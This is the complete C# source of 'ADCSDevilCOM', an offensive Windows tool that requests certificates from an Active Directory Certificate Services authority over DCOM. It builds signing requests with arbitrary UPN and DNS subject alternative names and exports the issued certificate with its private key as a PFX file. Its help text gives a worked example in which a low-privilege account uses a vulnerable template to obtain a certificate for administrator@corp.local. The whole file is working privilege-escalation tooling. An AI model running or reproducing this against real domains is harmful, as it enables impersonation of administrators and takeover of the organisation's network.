/*
 * ADCSDevilCOM - ADCS DCOM Certificate Request Tool - Modern C# Implementation
 * Compatible with .NET 9 and modern C# features
 * 
 * Build:
 *   dotnet build
 *   dotnet publish -c Release -r win-x64 --self-contained false
 *   or
 *   dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true

 * 
 * Run:
 *   ADCSDevilCOM.exe -target dc01.corp.local -ca DC01-CA -template VulnerableTemplate [OPTIONS]
 */

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.IO;

namespace ADCSRequestTool;

[ComImport]
[Guid("D99E6E74-FC88-11D0-B498-00A0C90312F3")]
public class CCertRequest { }

[ComImport]
[Guid("D99E6E70-FC88-11D0-B498-00A0C90312F3")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICertRequestD
{
    [PreserveSig]
    int Request(
        [In] uint dwFlags,
        [In, MarshalAs(UnmanagedType.LPWStr)] string pwszAuthority,
        [In, Out] ref uint pdwRequestId,
        [Out] out uint pdwDisposition,
        [In, MarshalAs(UnmanagedType.LPWStr)] string pwszAttributes,
        [In] ref CERTTRANSBLOB pctbRequest,
        [Out] out CERTTRANSBLOB pctbCertChain,
        [Out] out CERTTRANSBLOB pctbEncodedCert,
        [Out] out CERTTRANSBLOB pctbDispositionMessage
    );

    [PreserveSig]
    int GetCACert(
        [In] uint fchain,
        [In, MarshalAs(UnmanagedType.LPWStr)] string pwszAuthority,
        [Out] out CERTTRANSBLOB pctbOut
    );

    [PreserveSig]
    int Ping(
        [In, MarshalAs(UnmanagedType.LPWStr)] string pwszAuthority
    );
}

[StructLayout(LayoutKind.Sequential)]
public struct CERTTRANSBLOB
{
    public uint cb;
    public IntPtr pb;
}

public enum CertificateDisposition : uint
{
    INCOMPLETE = 0x00000000,
    ERROR = 0x00000001,
    DENIED = 0x00000002,
    ISSUED = 0x00000003,
    ISSUED_OUT_OF_BAND = 0x00000004,
    UNDER_SUBMISSION = 0x00000005
}

public static class NativeMethods
{
    public enum RPC_C_AUTHN_LEVEL
    {
        DEFAULT = 0,
        NONE = 1,
        CONNECT = 2,
        CALL = 3,
        PKT = 4,
        PKT_INTEGRITY = 5,
        PKT_PRIVACY = 6
    }

    public enum RPC_C_IMP_LEVEL
    {
        DEFAULT = 0,
        ANONYMOUS = 1,
        IDENTIFY = 2,
        IMPERSONATE = 3,
        DELEGATE = 4
    }

    public enum RPC_C_AUTHN
    {
        NONE = 0,
        DCE_PRIVATE = 1,
        DCE_PUBLIC = 2,
        DEC_PUBLIC = 4,
        GSS_NEGOTIATE = 9,
        WINNT = 10,
        GSS_SCHANNEL = 14,
        GSS_KERBEROS = 16,
        DPA = 17,
        MSN = 18,
        DIGEST = 21,
        MQ = 100
    }

    public enum RPC_C_AUTHZ : uint
    {
        NONE = 0,
        NAME = 1,
        DCE = 2,
        DEFAULT = 0xffffffff
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct COAUTHIDENTITY
    {
        [MarshalAs(UnmanagedType.LPWStr)]
        public string User;
        public uint UserLength;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string Domain;
        public uint DomainLength;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string Password;
        public uint PasswordLength;
        public uint Flags;
    }

    public const uint SEC_WINNT_AUTH_IDENTITY_UNICODE = 0x2;

    [StructLayout(LayoutKind.Sequential)]
    public struct COAUTHINFO
    {
        public RPC_C_AUTHN dwAuthnSvc;
        public RPC_C_AUTHZ dwAuthzSvc;
        public IntPtr pwszServerPrincName;
        public RPC_C_AUTHN_LEVEL dwAuthnLevel;
        public RPC_C_IMP_LEVEL dwImpersonationLevel;
        public IntPtr pAuthIdentityData;
        public uint dwCapabilities;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct COSERVERINFO
    {
        public uint dwReserved1;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwszName;
        public IntPtr pAuthInfo;
        public uint dwReserved2;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MULTI_QI
    {
        public IntPtr pIID;
        [MarshalAs(UnmanagedType.IUnknown)]
        public object pItf;
        public int hr;
    }

    [DllImport("ole32.dll", PreserveSig = false)]
    public static extern void CoCreateInstanceEx(
        [In] ref Guid rclsid,
        [MarshalAs(UnmanagedType.IUnknown)] object punkOuter,
        uint dwClsCtx,
        [In] ref COSERVERINFO pServerInfo,
        uint dwCount,
        [In, Out] MULTI_QI[] pResults
    );

    [DllImport("ole32.dll")]
    public static extern int CoSetProxyBlanket(
        [MarshalAs(UnmanagedType.IUnknown)] object pProxy,
        RPC_C_AUTHN dwAuthnSvc,
        RPC_C_AUTHZ dwAuthzSvc,
        IntPtr pServerPrincName,
        RPC_C_AUTHN_LEVEL dwAuthnLevel,
        RPC_C_IMP_LEVEL dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities
    );

    public const uint CLSCTX_REMOTE_SERVER = 0x10;
    public const uint EOAC_NONE = 0;
}

public class Arguments
{
    public string Target { get; set; } = "";
    public string CAName { get; set; } = "";
    public string Username { get; set; } = "";
    public string Password { get; set; } = "";
    public string Domain { get; set; } = "";
    public string Template { get; set; } = "";
    public string Subject { get; set; } = "";
    public string UPN { get; set; } = "";
    public string DNSName { get; set; } = "";
    public string OutputFile { get; set; } = "";
    public int KeySize { get; set; } = 2048;
    public int RetrieveRequestId { get; set; } = 0;
    public bool ShowHelp { get; set; } = false;
    public bool UseCurrentUser { get; set; } = false;

    public static Arguments Parse(string[] args)
    {
        var arguments = new Arguments();
        var argDict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i].StartsWith("-") || args[i].StartsWith("/"))
            {
                string key = args[i].TrimStart('-', '/').ToLower();

                if (key == "h" || key == "help")
                {
                    arguments.ShowHelp = true;
                    return arguments;
                }

                if (i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                {
                    argDict[key] = args[i + 1];
                    i++;
                }
            }
        }

        if (argDict.TryGetValue("target", out var target)) 
            arguments.Target = target;
        if (argDict.TryGetValue("ca", out var ca)) 
            arguments.CAName = ca;
        if (argDict.TryGetValue("username", out var username)) 
            arguments.Username = username;
        if (argDict.TryGetValue("password", out var password)) 
            arguments.Password = password;
        if (argDict.TryGetValue("domain", out var domain)) 
            arguments.Domain = domain;
        if (argDict.TryGetValue("template", out var template)) 
            arguments.Template = template;
        if (argDict.TryGetValue("subject", out var subject)) 
            arguments.Subject = subject;
        if (argDict.TryGetValue("upn", out var upn)) 
            arguments.UPN = upn;
        if (argDict.TryGetValue("dns", out var dns)) 
            arguments.DNSName = dns;
        if (argDict.TryGetValue("out", out var outFile)) 
            arguments.OutputFile = outFile;

        // Parse keysize
        if (argDict.ContainsKey("keysize"))
        {
            string keysizeValue = argDict["keysize"];
            int parsedKeysize;
            if (int.TryParse(keysizeValue, out parsedKeysize))
            {
                arguments.KeySize = parsedKeysize;
            }
        }

        // Parse retrieve
        if (argDict.ContainsKey("retrieve"))
        {
            string retrieveValue = argDict["retrieve"];
            int parsedRetrieve;
            if (int.TryParse(retrieveValue, out parsedRetrieve))
            {
                arguments.RetrieveRequestId = parsedRetrieve;
            }
        }

        return arguments;
    }

    public bool Validate()
    {
        // Check if we should use current user context
        if (string.IsNullOrEmpty(Username) && string.IsNullOrEmpty(Password) && string.IsNullOrEmpty(Domain))
        {
            UseCurrentUser = true;
            
            // Get current user information
            string currentUser = Environment.UserName;
            string currentDomain = Environment.UserDomainName;
            
            Username = currentUser;
            Domain = currentDomain;
            
            Console.WriteLine($"[*] Using current user context: {currentDomain}\\{currentUser}");
        }
        
        if (string.IsNullOrEmpty(Target) || string.IsNullOrEmpty(CAName))
        {
            return false;
        }

        // For current user context, we don't need explicit password
        if (!UseCurrentUser && (string.IsNullOrEmpty(Username) || string.IsNullOrEmpty(Password) || string.IsNullOrEmpty(Domain)))
        {
            return false;
        }

        if (RetrieveRequestId == 0 && string.IsNullOrEmpty(Subject))
        {
            // Auto-generate subject from username if not provided
            Subject = $"CN={Username}";
            Console.WriteLine($"[*] Auto-generated subject: {Subject}");
        }

        return true;
    }
}

public class CSRGenerator
{
    private RSA? privateKey;

    public RSA? PrivateKey => privateKey;

    public byte[] GenerateKeyPair(int keySize)
    {
        Console.WriteLine($"[*] Generating {keySize}-bit RSA key pair...");
        privateKey = RSA.Create(keySize);
        Console.WriteLine("[+] Key pair generated successfully");
        return privateKey.ExportRSAPrivateKey();
    }

    public byte[] CreateCSR(string subject, string? upn, string? dnsName)
    {
        if (privateKey == null)
            throw new InvalidOperationException("Key pair must be generated first");

        Console.WriteLine($"[*] Creating CSR for subject: {subject}");

        var subjectDN = new X500DistinguishedName(subject);
        var request = new CertificateRequest(subjectDN, privateKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

        var sanBuilder = new SubjectAlternativeNameBuilder();
        bool hasSAN = false;

        if (!string.IsNullOrEmpty(upn))
        {
            Console.WriteLine($"[+] Adding UPN: {upn}");
            sanBuilder.AddUserPrincipalName(upn);
            hasSAN = true;
        }

        if (!string.IsNullOrEmpty(dnsName))
        {
            Console.WriteLine($"[+] Adding DNS: {dnsName}");
            sanBuilder.AddDnsName(dnsName);
            hasSAN = true;
        }

        if (hasSAN)
        {
            request.CertificateExtensions.Add(sanBuilder.Build());
        }

        byte[] csr = request.CreateSigningRequest();
        Console.WriteLine($"[+] CSR created successfully ({csr.Length} bytes)");
        return csr;
    }

    public void SavePrivateKeyPEM(string filename)
    {
        if (privateKey == null)
        {
            Console.WriteLine("[-] No private key to save");
            return;
        }

        byte[] keyBytes = privateKey.ExportRSAPrivateKey();
        string base64 = Convert.ToBase64String(keyBytes);

        var pem = new StringBuilder();
        pem.AppendLine("-----BEGIN RSA PRIVATE KEY-----");

        for (int i = 0; i < base64.Length; i += 64)
        {
            int length = Math.Min(64, base64.Length - i);
            pem.AppendLine(base64.Substring(i, length));
        }

        pem.AppendLine("-----END RSA PRIVATE KEY-----");
        File.WriteAllText(filename, pem.ToString());
        Console.WriteLine($"[+] Private key saved to: {filename}");
    }

    public byte[] CreatePFX(byte[] certificateData, string password = "")
    {
        if (privateKey == null)
        {
            throw new InvalidOperationException("Private key not available");
        }

        // Load the certificate using the new API
        var cert = X509CertificateLoader.LoadCertificate(certificateData);
        
        // Create a new certificate with the private key
        var certWithKey = cert.CopyWithPrivateKey(privateKey);
        
        // Export as PFX
        byte[] pfxData;
        if (string.IsNullOrEmpty(password))
        {
            pfxData = certWithKey.Export(X509ContentType.Pfx);
        }
        else
        {
            pfxData = certWithKey.Export(X509ContentType.Pfx, password);
        }
        
        return pfxData;
    }
}

public class ADCSClient : IDisposable
{
    private readonly Arguments args;
    private ICertRequestD? certRequest;
    private bool disposed = false;
    private CSRGenerator? csrGenerator;

    public ADCSClient(Arguments arguments)
    {
        args = arguments;
    }

    public void SetCSRGenerator(CSRGenerator generator)
    {
        csrGenerator = generator;
    }

    public bool Connect()
    {
        Console.WriteLine("[*] Establishing DCOM connection...");
        Console.WriteLine($"    Target: {args.Target}");
        Console.WriteLine($"    CA: {args.CAName}");
        
        if (args.UseCurrentUser)
        {
            Console.WriteLine($"    User: {args.Domain}\\{args.Username} (current user)");
        }
        else
        {
            Console.WriteLine($"    User: {args.Domain}\\{args.Username}");
        }

        try
        {
            NativeMethods.COAUTHIDENTITY authIdentity;
            IntPtr pAuthIdentity;
            
            if (args.UseCurrentUser)
            {
                // Use null for current user credentials
                pAuthIdentity = IntPtr.Zero;
            }
            else
            {
                // Use explicit credentials
                authIdentity = new NativeMethods.COAUTHIDENTITY
                {
                    User = args.Username,
                    UserLength = (uint)args.Username.Length,
                    Domain = args.Domain,
                    DomainLength = (uint)args.Domain.Length,
                    Password = args.Password,
                    PasswordLength = (uint)args.Password.Length,
                    Flags = NativeMethods.SEC_WINNT_AUTH_IDENTITY_UNICODE
                };

                pAuthIdentity = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeMethods.COAUTHIDENTITY)));
                Marshal.StructureToPtr(authIdentity, pAuthIdentity, false);
            }

            var authInfo = new NativeMethods.COAUTHINFO
            {
                dwAuthnSvc = NativeMethods.RPC_C_AUTHN.WINNT,
                dwAuthzSvc = NativeMethods.RPC_C_AUTHZ.NONE,
                pwszServerPrincName = IntPtr.Zero,
                dwAuthnLevel = NativeMethods.RPC_C_AUTHN_LEVEL.PKT_PRIVACY,
                dwImpersonationLevel = NativeMethods.RPC_C_IMP_LEVEL.IMPERSONATE,
                pAuthIdentityData = pAuthIdentity,
                dwCapabilities = NativeMethods.EOAC_NONE
            };

            IntPtr pAuthInfo = Marshal.AllocHGlobal(Marshal.SizeOf(authInfo));
            Marshal.StructureToPtr(authInfo, pAuthInfo, false);

            var serverInfo = new NativeMethods.COSERVERINFO
            {
                dwReserved1 = 0,
                pwszName = args.Target,
                pAuthInfo = args.UseCurrentUser ? IntPtr.Zero : pAuthInfo,
                dwReserved2 = 0
            };

            Guid iid = typeof(ICertRequestD).GUID;
            IntPtr pIID = Marshal.AllocHGlobal(Marshal.SizeOf(iid));
            Marshal.StructureToPtr(iid, pIID, false);

            var mqi = new NativeMethods.MULTI_QI[1];
            mqi[0].pIID = pIID;
#pragma warning disable CS8625
            mqi[0].pItf = null;
#pragma warning restore CS8625
            mqi[0].hr = 0;

            Console.WriteLine("[*] Calling CoCreateInstanceEx (DCOM activation)...");
            Guid clsid = typeof(CCertRequest).GUID;

#pragma warning disable CS8625
            NativeMethods.CoCreateInstanceEx(ref clsid, null, NativeMethods.CLSCTX_REMOTE_SERVER, ref serverInfo, 1, mqi);
#pragma warning restore CS8625

            if (mqi[0].hr != 0)
            {
                Console.WriteLine($"[-] CoCreateInstanceEx failed: 0x{mqi[0].hr:X8}");
                if (pAuthIdentity != IntPtr.Zero) Marshal.FreeHGlobal(pAuthIdentity);
                Marshal.FreeHGlobal(pAuthInfo);
                Marshal.FreeHGlobal(pIID);
                return false;
            }

            certRequest = (ICertRequestD)mqi[0].pItf;
            Console.WriteLine("[+] ICertRequestD interface acquired");

            int hr;
            if (args.UseCurrentUser)
            {
                hr = NativeMethods.CoSetProxyBlanket(certRequest, NativeMethods.RPC_C_AUTHN.WINNT, NativeMethods.RPC_C_AUTHZ.NONE, IntPtr.Zero, NativeMethods.RPC_C_AUTHN_LEVEL.PKT_PRIVACY, NativeMethods.RPC_C_IMP_LEVEL.IMPERSONATE, IntPtr.Zero, NativeMethods.EOAC_NONE);
            }
            else
            {
                hr = NativeMethods.CoSetProxyBlanket(certRequest, NativeMethods.RPC_C_AUTHN.WINNT, NativeMethods.RPC_C_AUTHZ.NONE, IntPtr.Zero, NativeMethods.RPC_C_AUTHN_LEVEL.PKT_PRIVACY, NativeMethods.RPC_C_IMP_LEVEL.IMPERSONATE, pAuthIdentity, NativeMethods.EOAC_NONE);
            }

            if (hr != 0)
            {
                Console.WriteLine($"[-] CoSetProxyBlanket failed: 0x{hr:X8}");
                return false;
            }

            Console.WriteLine("[+] Authentication configured");
            Console.WriteLine("[+] Connection established successfully!");

            if (pAuthIdentity != IntPtr.Zero) Marshal.FreeHGlobal(pAuthIdentity);
            Marshal.FreeHGlobal(pAuthInfo);
            Marshal.FreeHGlobal(pIID);

            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Connection failed: {ex.Message}");
            return false;
        }
    }

    public bool SubmitRequest(byte[] csrData, out byte[]? certificate)
    {
        certificate = null;

        if (certRequest == null)
        {
            Console.WriteLine("[-] Not connected");
            return false;
        }

        Console.WriteLine("\n[*] Submitting certificate request...");
        Console.WriteLine($"    Template: {args.Template}");
        Console.WriteLine($"    CSR size: {csrData.Length} bytes");

        string attributes = $"CertificateTemplate:{args.Template}";
        if (!string.IsNullOrEmpty(args.UPN))
        {
            attributes += $"\nSAN:upn={args.UPN}";
            Console.WriteLine($"    UPN: {args.UPN}");
        }
        if (!string.IsNullOrEmpty(args.DNSName))
        {
            attributes += $"\nSAN:dns={args.DNSName}";
            Console.WriteLine($"    DNS: {args.DNSName}");
        }

        IntPtr pCSR = Marshal.AllocHGlobal(csrData.Length);
        Marshal.Copy(csrData, 0, pCSR, csrData.Length);

        var requestBlob = new CERTTRANSBLOB
        {
            cb = (uint)csrData.Length,
            pb = pCSR
        };

        uint dwFlags = 0;
        uint dwRequestId = 0;

        try
        {
            Console.WriteLine("[*] Calling ICertRequestD::Request() via DCOM...");

            int hr = certRequest.Request(dwFlags, args.CAName, ref dwRequestId, out uint dwDisposition, attributes, ref requestBlob, out _, out CERTTRANSBLOB encodedCert, out CERTTRANSBLOB dispositionMessage);

            Marshal.FreeHGlobal(pCSR);

            if (hr != 0)
            {
                Console.WriteLine($"[-] Request failed: 0x{hr:X8}");
                return false;
            }

            Console.WriteLine($"\n[+] Request completed");
            Console.WriteLine($"    Request ID: {dwRequestId}");
            Console.WriteLine($"    Disposition: {GetDispositionString((CertificateDisposition)dwDisposition)} ({dwDisposition})");

            bool success = false;

            switch ((CertificateDisposition)dwDisposition)
            {
                case CertificateDisposition.ISSUED:
                    Console.WriteLine("\n[+] ✓ Certificate ISSUED successfully!");
                    if (encodedCert.cb > 0 && encodedCert.pb != IntPtr.Zero)
                    {
                        Console.WriteLine($"    Certificate size: {encodedCert.cb} bytes");

                        certificate = new byte[encodedCert.cb];
                        Marshal.Copy(encodedCert.pb, certificate, 0, (int)encodedCert.cb);

                        // Create PFX if we have the private key
                        if (csrGenerator?.PrivateKey != null)
                        {
                            string pfxFilename = string.IsNullOrEmpty(args.OutputFile) ? $"{args.Username}.pfx" : $"{args.OutputFile}.pfx";
                            
                            try
                            {
                                byte[] pfxData = csrGenerator.CreatePFX(certificate);
                                File.WriteAllBytes(pfxFilename, pfxData);
                                Console.WriteLine($"[+] Certificate and private key saved to: {pfxFilename}");
                                success = true;
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[-] Failed to create PFX: {ex.Message}");
                                // Fall back to saving just the certificate
                                string cerFilename = string.IsNullOrEmpty(args.OutputFile) ? $"{args.Username}_certificate.cer" : $"{args.OutputFile}.cer";
                                File.WriteAllBytes(cerFilename, certificate);
                                Console.WriteLine($"[+] Certificate saved to: {cerFilename}");
                            }
                        }
                        else
                        {
                            // No private key, save as CER
                            string cerFilename = string.IsNullOrEmpty(args.OutputFile) ? $"{args.Username}_certificate.cer" : $"{args.OutputFile}.cer";
                            File.WriteAllBytes(cerFilename, certificate);
                            Console.WriteLine($"[+] Certificate saved to: {cerFilename}");
                            success = true;
                        }
                    }
                    break;

                case CertificateDisposition.UNDER_SUBMISSION:
                    Console.WriteLine("\n[!] Certificate request is PENDING approval");
                    Console.WriteLine($"    Request ID: {dwRequestId}");
                    Console.WriteLine($"\n[!] To retrieve later, use:");
                    Console.WriteLine($"    {Environment.GetCommandLineArgs()[0]} -retrieve {dwRequestId}");
                    break;

                case CertificateDisposition.DENIED:
                    Console.WriteLine("\n[-] Certificate request DENIED");
                    if (dispositionMessage.cb > 0 && dispositionMessage.pb != IntPtr.Zero)
                    {
                        string? msg = Marshal.PtrToStringUni(dispositionMessage.pb);
                        Console.WriteLine($"    Reason: {msg}");
                    }
                    break;

                case CertificateDisposition.ERROR:
                    Console.WriteLine("\n[-] Certificate request ERROR");
                    if (dispositionMessage.cb > 0 && dispositionMessage.pb != IntPtr.Zero)
                    {
                        string? msg = Marshal.PtrToStringUni(dispositionMessage.pb);
                        Console.WriteLine($"    Message: {msg}");
                    }
                    break;

                default:
                    Console.WriteLine($"\n[?] Unknown disposition: {dwDisposition}");
                    break;
            }

            return success;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Exception: {ex.Message}");
            Marshal.FreeHGlobal(pCSR);
            return false;
        }
    }

    public bool RetrieveCertificate(uint requestId, out byte[]? certificate)
    {
        certificate = null;

        if (certRequest == null)
        {
            Console.WriteLine("[-] Not connected");
            return false;
        }

        Console.WriteLine($"\n[*] Retrieving certificate...");
        Console.WriteLine($"    Request ID: {requestId}");

        var emptyBlob = new CERTTRANSBLOB { cb = 0, pb = IntPtr.Zero };
        uint dwFlags = 0;
        uint mutableRequestId = requestId;

        try
        {
            int hr = certRequest.Request(dwFlags, args.CAName, ref mutableRequestId, out uint dwDisposition, "", ref emptyBlob, out _, out CERTTRANSBLOB encodedCert, out _);

            if (hr != 0)
            {
                Console.WriteLine($"[-] Retrieval failed: 0x{hr:X8}");
                return false;
            }

            Console.WriteLine($"[+] Disposition: {GetDispositionString((CertificateDisposition)dwDisposition)}");

            bool success = false;

            if (dwDisposition == (uint)CertificateDisposition.ISSUED && encodedCert.cb > 0)
            {
                Console.WriteLine($"[+] Certificate retrieved ({encodedCert.cb} bytes)");

                certificate = new byte[encodedCert.cb];
                Marshal.Copy(encodedCert.pb, certificate, 0, (int)encodedCert.cb);

                // Try to find matching private key
                string keyFilename = $"{requestId}.key";
                if (File.Exists(keyFilename))
                {
                    Console.WriteLine($"[*] Found matching private key: {keyFilename}");
                    
                    try
                    {
                        string pemKey = File.ReadAllText(keyFilename);
                        RSA? rsa = LoadPrivateKeyFromPEM(pemKey);
                        
                        if (rsa != null)
                        {
                            var cert = X509CertificateLoader.LoadCertificate(certificate);
                            var certWithKey = cert.CopyWithPrivateKey(rsa);
                            byte[] pfxData = certWithKey.Export(X509ContentType.Pfx);
                            
                            string pfxFilename = string.IsNullOrEmpty(args.OutputFile) ? $"request_{requestId}.pfx" : $"{args.OutputFile}.pfx";
                            File.WriteAllBytes(pfxFilename, pfxData);
                            Console.WriteLine($"[+] Certificate and private key saved to: {pfxFilename}");
                            success = true;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Failed to combine with private key: {ex.Message}");
                        // Fall back to saving just certificate
                        string cerFilename = string.IsNullOrEmpty(args.OutputFile) ? $"request_{requestId}.cer" : $"{args.OutputFile}.cer";
                        File.WriteAllBytes(cerFilename, certificate);
                        Console.WriteLine($"[+] Certificate saved to: {cerFilename}");
                        success = true;
                    }
                }
                else
                {
                    Console.WriteLine($"[!] No private key found ({keyFilename})");
                    string cerFilename = string.IsNullOrEmpty(args.OutputFile) ? $"request_{requestId}.cer" : $"{args.OutputFile}.cer";
                    File.WriteAllBytes(cerFilename, certificate);
                    Console.WriteLine($"[+] Certificate saved to: {cerFilename}");
                    success = true;
                }
            }

            return success;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Exception: {ex.Message}");
            return false;
        }
    }

    private static string GetDispositionString(CertificateDisposition disposition) => disposition switch
    {
        CertificateDisposition.INCOMPLETE => "INCOMPLETE",
        CertificateDisposition.ERROR => "ERROR",
        CertificateDisposition.DENIED => "DENIED",
        CertificateDisposition.ISSUED => "ISSUED",
        CertificateDisposition.ISSUED_OUT_OF_BAND => "ISSUED_OUT_OF_BAND",
        CertificateDisposition.UNDER_SUBMISSION => "PENDING",
        _ => "UNKNOWN"
    };

    private static RSA? LoadPrivateKeyFromPEM(string pemKey)
    {
        try
        {
            // Remove PEM headers and decode
            string base64 = pemKey
                .Replace("-----BEGIN RSA PRIVATE KEY-----", "")
                .Replace("-----END RSA PRIVATE KEY-----", "")
                .Replace("\r", "")
                .Replace("\n", "")
                .Trim();

            byte[] keyBytes = Convert.FromBase64String(base64);
            
            var rsa = RSA.Create();
            rsa.ImportRSAPrivateKey(keyBytes, out _);
            return rsa;
        }
        catch
        {
            return null;
        }
    }

    public void Dispose()
    {
        if (!disposed)
        {
            if (certRequest != null)
            {
                if (OperatingSystem.IsWindows())
                {
                    Marshal.ReleaseComObject(certRequest);
                }
                certRequest = null;
            }
            disposed = true;
        }
        GC.SuppressFinalize(this);
    }
}

class Program
{
    static void PrintBanner()
    {
        Console.WriteLine();
        Console.WriteLine("================================================================");
        Console.WriteLine("  ADCSDevilCOM - by Abhiram Vijayan (7hePr0fess0r)");
        Console.WriteLine("  ADCS DCOM Certificate Requesting Tool");
        Console.WriteLine("================================================================");
        Console.WriteLine();
    }

    static void PrintHelp()
    {
        Console.WriteLine("Usage: ADCSDevilCOM.exe [OPTIONS]");
        Console.WriteLine();
        Console.WriteLine("Required:");
        Console.WriteLine("  -target <server>   Target CA server");
        Console.WriteLine("  -ca <name>         Certificate Authority name");
        Console.WriteLine("  -template <name>   Certificate template");
        Console.WriteLine();
        Console.WriteLine("Request Mode:");
        Console.WriteLine("  -username <user>   Username");
        Console.WriteLine("  -password <pass>   Password");
        Console.WriteLine("  -domain <domain>   Domain name");
        Console.WriteLine("  -subject <dn>      Subject DN (e.g. CN=User)");
        Console.WriteLine("  -upn <upn>         UPN for SAN");
        Console.WriteLine("  -dns <name>        DNS for SAN");
        Console.WriteLine("  -keysize <bits>    RSA key size (default: 2048)");
        Console.WriteLine("  -out <file>        Output filename");
        Console.WriteLine();
        Console.WriteLine("Retrieve Mode:");
        Console.WriteLine("  -retrieve <id>     Retrieve certificate by request ID");
        Console.WriteLine();
        Console.WriteLine("Examples:");
        Console.WriteLine("  ADCSRequestTool.exe -target dc01.corp.local -ca DC01-CA -template User");
        Console.WriteLine();
        Console.WriteLine("  ADCSRequestTool.exe -target dc01.corp.local -ca DC01-CA");
        Console.WriteLine("    -username lowpriv -password Pass123 -domain CORP");
        Console.WriteLine("    -template VulnTemplate -subject \"CN=Low Priv\"");
        Console.WriteLine("    -upn administrator@corp.local -out admin_cert");
        Console.WriteLine();
    }

    static int Main(string[] args)
    {
        PrintBanner();

        var arguments = Arguments.Parse(args);

        if (arguments.ShowHelp || args.Length == 0)
        {
            PrintHelp();
            return 0;
        }

        if (!arguments.Validate())
        {
            Console.WriteLine("[-] Missing required arguments. Use -h for help.");
            return 1;
        }

        Console.WriteLine("[*] Configuration:");
        Console.WriteLine($"    Target:   {arguments.Target}");
        Console.WriteLine($"    CA Name:  {arguments.CAName}");
        Console.WriteLine($"    Domain:   {arguments.Domain}");
        Console.WriteLine($"    Username: {arguments.Username}");

        if (arguments.RetrieveRequestId > 0)
        {
            Console.WriteLine($"    Mode:     RETRIEVE (Request ID: {arguments.RetrieveRequestId})");
        }
        else
        {
            Console.WriteLine("    Mode:     REQUEST");
            Console.WriteLine($"    Template: {arguments.Template}");
            Console.WriteLine($"    Subject:  {arguments.Subject}");
            if (!string.IsNullOrEmpty(arguments.UPN))
                Console.WriteLine($"    UPN:      {arguments.UPN}");
            if (!string.IsNullOrEmpty(arguments.DNSName))
                Console.WriteLine($"    DNS:      {arguments.DNSName}");
            Console.WriteLine($"    Key Size: {arguments.KeySize} bits");
        }
        Console.WriteLine();

        bool success = false;

        using (var client = new ADCSClient(arguments))
        {
            if (!client.Connect())
            {
                Console.WriteLine("\n[-] Failed to connect to CA server");
                Console.WriteLine("\n[!] Troubleshoot:");
                Console.WriteLine("    - Verify target server is reachable");
                Console.WriteLine("    - Check credentials are correct");
                Console.WriteLine("    - Ensure SMB (port 445) is accessible");
                Console.WriteLine("    - Verify CA service is running");
                return 1;
            }

            try
            {
                if (arguments.RetrieveRequestId > 0)
                {
                    success = client.RetrieveCertificate((uint)arguments.RetrieveRequestId, out _);
                }
                else
                {
                    var csrGen = new CSRGenerator();
                    csrGen.GenerateKeyPair(arguments.KeySize);
                    byte[] csrData = csrGen.CreateCSR(arguments.Subject, arguments.UPN, arguments.DNSName);

                    client.SetCSRGenerator(csrGen);
                    success = client.SubmitRequest(csrData, out _);

                    if (!success && !string.IsNullOrEmpty(arguments.UPN))
                    {
                        string keyFile = $"{arguments.Username}.key";
                        csrGen.SavePrivateKeyPEM(keyFile);
                        Console.WriteLine($"\n[!] Private key saved to: {keyFile}");
                        Console.WriteLine($"[!] Use this to retrieve later and create PFX");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[-] Exception: {ex.Message}");
                Console.WriteLine(ex.StackTrace);
                return 1;
            }
        }

        Console.WriteLine();
        Console.WriteLine("===============================================================");
        if (success)
        {
            Console.WriteLine("Operation completed successfully!");
        }
        else
        {
            Console.WriteLine("Operation completed with warnings");
        }
        Console.WriteLine("===============================================================");
        Console.WriteLine();

        return success ? 0 : 1;
    }
}
